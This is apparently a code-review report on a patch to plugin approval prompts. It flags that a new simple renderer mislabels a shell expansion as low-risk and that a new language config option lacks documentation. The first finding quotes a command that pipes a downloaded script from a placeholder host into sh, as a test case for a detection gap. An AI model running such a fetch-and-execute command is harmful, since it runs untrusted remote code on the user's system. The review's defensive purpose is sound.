## Review Findings

Overall correctness: patch is incorrect

Overall confidence: 0.87

Full review comments:

- **[P1] Fail closed on shell expansions in simple approvals:** `src/infra/plugin-approvals.ts:327-333`
  - body: The new simple renderer can label a valid shell expansion like `echo $(curl https://example.test/install.sh | sh)` as low-risk `print text`: the pipe-to-shell regex does not match `sh)` inside `$()`, then the `echo` branch returns low risk. Since this text leads an approval prompt, unknown shell syntax should fall back to a conservative medium/high summary and have regression coverage.
  - confidence: 0.86
- **[P2] Document the plugin approval language config:** `src/config/schema.help.ts:778-779`
  - body: This adds the public `approvals.plugin.language` option, but the public approvals docs still say the plugin config shape is identical to `approvals.exec` and list only `enabled`, `mode`, `agentFilter`, `sessionFilter`, and `targets`. Update the user docs/examples so the new simple mode is discoverable and the config contract is aligned.
  - confidence: 0.78
